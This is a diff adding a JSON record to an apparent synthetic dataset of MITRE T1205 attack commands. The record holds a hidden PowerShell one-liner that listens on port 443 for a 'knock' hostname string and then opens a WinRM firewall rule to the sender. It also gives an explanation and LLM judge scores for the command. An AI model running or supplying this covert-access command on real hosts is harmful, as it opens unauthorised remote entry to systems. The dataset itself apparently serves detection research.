@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1205",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'powershell -NoP -W Hidden -Command & { if (-not (Get-NetFirewallRule -DisplayName ''Signal-Open-WinRM-SNI'' -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName ''Signal-Open-WinRM-SNI'' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 5986 -Enabled False } else { Set-NetFirewallRule -DisplayName ''Signal-Open-WinRM-SNI'' -Enabled False }; $l=[System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any,443); $l.Start(); $c=$l.AcceptTcpClient(); $ns=$c.GetStream(); $buf=New-Object byte[] 4096; $n=$ns.Read($buf,0,$buf.Length); $s=[Text.Encoding]::ASCII.GetString($buf,0,$n); if($s -like ''*knock.example.org*''){ $src=$c.Client.RemoteEndPoint.Address.ToString(); Set-NetFirewallRule -DisplayName ''Signal-Open-WinRM-SNI'' -Enabled True -RemoteAddress $src }; $c.Close(); $l.Stop() }'",
+  "explanation": "Accepts a TCP connection on 443 and inspects the initial ClientHello bytes for an SNI value containing 'knock.example.org' (TLS application signal in cleartext SNI). On match, it enables a WinRM HTTPS firewall rule for that client.",
+  "rationale_steps": [
+    "Create disabled inbound rule for TCP/5986.",
+    "Start a TCP listener on 443 and read the first packet from the client.",
+    "Search for the SNI hostname token and enable the rule for the client IP."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1205-5411a282-1ddefe58",
+  "source_prompt_hash": "5411a282",
+  "timestamp_utc": "2025-09-30T03:46:23.408122Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "PowerShell/WMI invocation is well-formed with balanced quotes/braces, valid parameters, proper separators, and correctly escaped single quotes inside the ArgumentList.",
+        "semantic_score": 3,
+        "semantic_justification": "It implements SNI-based signaling and attempts to toggle a WinRM firewall rule, but modifying firewall rules requires admin rights (conflicting with Privilege: None) and the single Read may miss SNI due to fragmentation, reducing likelihood of achieving the stated effect.",
+        "combined_score": 4.0,
+        "confidence": 0.85,
+        "timestamp": "2025-10-01T17:21:21.369310Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 4,
+        "syntactic_justification": "The command is largely well-formed with properly nested quotes (single within double within the ArgumentList string), balanced braces and parentheses, and valid PowerShell constructs, though the deeply nested quoting with escaped single quotes inside WMI's ArgumentList string creates edge-case parsing fragility.",
+        "semantic_score": 4,
+        "semantic_justification": "The command correctly implements a port-knocking/traffic-signaling mechanism by listening on TCP 443, inspecting incoming data for an SNI-like string ('knock.example.org'), and conditionally enabling a WinRM firewall rule for the source IP, which aligns well with T1205; however, it reads raw bytes rather than properly parsing TLS ClientHello SNI fields, so the SNI inspection is approximate and may not reliably extract the SNI from a real TLS handshake, and the 'None' privilege claim is inaccurate since firewall rule manipulation and WMI process creation typically require elevated privileges.",
+        "combined_score": 4.0,
+        "confidence": 0.82,
+        "timestamp": "2026-02-19T04:00:31.304308Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly formed, using correct PowerShell syntax, balanced braces, and proper escaping of single quotes (using double single-quotes) inside the WMI argument string.",
+        "semantic_score": 5,
+        "semantic_justification": "The command realistically implements T1205 (Traffic Signaling) by setting up a listener on port 443, inspecting the incoming stream for a specific SNI-like string, and dynamically modifying the Windows Firewall to authorize the signaling IP for WinRM access.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2026-02-19T04:00:34.426624Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.333,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
